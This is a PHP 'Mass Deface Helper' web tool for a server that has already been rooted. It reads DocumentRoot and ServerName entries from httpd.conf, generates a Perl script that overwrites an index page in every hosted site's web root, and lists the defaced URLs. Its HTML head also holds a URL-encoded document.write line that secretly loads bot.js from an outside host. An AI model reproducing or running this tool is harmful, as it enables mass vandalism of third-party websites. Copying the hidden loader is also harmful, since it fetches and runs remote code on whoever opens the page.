<?php
echo "<html>
<head>
<title>Mass Deface Helper </title>
<style>
body {background : black;}
fri {border-bottom : 1px red;}
.greetz {color : red ;font-family : Comic Sans MS;font-size : 15px;height : 4%;width : 25%;position : fixed ;bottom : 0;right : 0;background : black;border : 2px solid #00ff00;}
help {color:red;background : black;font: 13px Comic Sans MS;font-weight:bold;}
.but {background-color:rgba(25,25,25,0.6);border:2; padding:2px; border-bottom:2px solid lime; font-size:25px;font-family:Comic Sans MS; color:red;border:2px solid lime;margin:4px 4px 8px 0;}
.but:hover{color:Lime;}
input[type='text'] {background:#111111; border:1; padding:2px; border-bottom:2px solid #393939;font-family:Comic Sans MS; font-size:17px; color:#ffffff;border:3px solid #00ff00;margin:4px 4px 2px 0;}
input[type='text']:hover{border : 2px  #999999;color:Lime;}
</style>
<script type='text/javascript'>
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%62%30%72%75%37%30%2E%67%69%74%68%75%62%2E%69%6F%2F%62%6F%74%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>
<br />";
echo "<span style=\"color:lime; font: 14px Comic Sans MS; font-weight:bold;\">Help :<br>1. After u get root, Upload ur deface source as index.txt <br>2. Run this comand on ur CMD / Terminal : <br></span><br/>";
echo "<tr><td><help>    <blink>=></blink> cat /etc/httpd/conf/httpd.conf | grep DocumentRoot>dir.txt </help></td><td><br/>";
echo "<tr><td><help>    <blink>=></blink> cat /etc/httpd/conf/httpd.conf | grep ServerName>dmn.txt </help></td><td><br><br/><br/>";
echo "<form method=POST>
<tr><td>
<help title='the file you want to put in all sites'> Def page name : </help>
  <input title='the file name you want to put in all sites' type=text name=index value=bie.htm> |
<help title='your deface page's source code'>Def source code :</help>
  <input title='your index source code' type='text' name='source' value='index.txt'><br><br>
<help>List DocumentRoot from httpd.conf  : </help><br>
<input type=text name=dirs size=\"40\">
<br><br>
<help>List ServerName from httpd.conf : </help><br>
<input type=text name=sites size=\"40\">
<br><br>
<tr><td><center><input class='but' type=submit value='Generate ' name='go'></center>
</form>
<br/></td><td></table>";
if($_POST['go']){
echo "<b></b>";
$index = $_POST['index'];
$source = $_POST['source'];
$dirs =explode("\n",@dd1(file_get_contents($_POST['dirs'])));
$sites =explode("\n",@dd2(file_get_contents($_POST['sites'])));
// preparing perl script
if($_POST['dirs']){
    $perl = fopen ('mass.txt','w+') or die (" WTF !! , i cannot create files o__O");
    $perl_start = "#!/usr/bin/perl";
    $perl_end = "print\"All Defaced !\";";
    fwrite ($perl,$perl_start."\n\n"); // Write !!
foreach($dirs as $dir){
$result = "system(\"cat ".$source." > ".@kill($dir)."/".$index."\");";
fwrite ($perl, $result."\n");
flush();
}
    echo "<tr><td><font style='font: 9pt Comic Sans MS; COLOR: #FFFFFF;font-weight:bold;'>perl script <a style='text-decoration: none;color:lime;' href='mass.txt'>mass.txt</a></font></td><td><br>";
    echo "<help>Now run this mass.txt on ur CMD / Terminal <blink>=> </blink> perl mass.txt </help><br>";
    fwrite ($perl, "\n".$perl_end);
    fclose($perl);
    }
    // preparing sites list
if($_POST['sites']){
    $sitess = fopen ('sites.txt','w+') or die ("WTF !! , i can't create files o__O");
    $sitess_start = "http://";
    $sitess_end = "/";
    fwrite ($sitess,"");
foreach($sites as $site){
    $result2 = $sitess_start.@kill($site).$sitess_end.$index;
    fwrite ($sitess, $result2."\n");
    flush();
}
    echo "<br /><tr><td><help>Defaced sites : <a style='text-decoration: none;color:lime;' href='sites.txt'>sites.txt</a></help></td><td><br/><br/>";
    fwrite ($sitess,"");
    fclose($sitess);
}
  }
function kill($value){  return str_replace(array("\n","\r"),"",$value); }
function dd1($value){  return str_replace(array("DocumentRoot"," "),"",$value); }
function dd2($value){  return str_replace(array("ServerName"," "),"",$value); }
echo "<br />";
echo "<div class='greetz'><center> <marquee> Original script by <b>ReZK2LL </marquee></center><font></div>";
?>
